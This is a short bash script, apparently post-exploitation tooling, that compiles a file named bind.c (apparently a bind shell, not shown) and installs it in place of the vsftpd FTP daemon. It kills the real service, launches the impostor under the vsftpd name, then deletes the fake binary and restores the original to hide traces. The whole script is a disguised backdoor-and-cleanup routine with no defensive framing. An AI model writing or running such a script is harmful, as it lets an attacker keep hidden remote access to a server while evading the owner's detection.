#!/bin/bash
gcc -o /usr/sbin/vsftp /bind.c
chmod +x /usr/sbin/vsftp
mv /usr/sbin/vsftpd /usr/sbin/vsftpd.bak
ln -s /usr/sbin/vsftp /usr/sbin/vsftpd
pkill vsftpd
/usr/sbin/vsftpd &
rm /usr/sbin/vsftp
rm /usr/sbin/vsftpd
mv /usr/sbin/vsftpd.bak /usr/sbin/vsftpd
